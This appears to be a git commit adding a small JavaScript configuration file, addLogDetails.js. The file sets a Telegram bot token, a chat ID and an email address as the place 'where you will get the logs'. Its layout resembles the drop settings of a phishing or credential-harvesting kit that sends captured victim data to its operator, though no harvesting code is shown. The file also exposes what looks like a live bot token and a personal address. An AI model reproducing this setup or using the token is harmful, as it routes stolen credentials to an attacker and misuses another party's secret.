ba0c54aeb711021f8c0813bf720b2afa4631a4e2
finesse202 <157296102+finesse202@users.noreply.github.com>
2024-07-01 22:41:18 +0200

    Add files via upload

---
+++ addLogDetails.js
@@ -0,0 +1,6 @@
+// Add your bot details here👇 (this is where you will get the logs)
+
+var telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI";
+var chatId = 7323113234;
+
+var emailForLogs = "finessee2024@gmail.com";
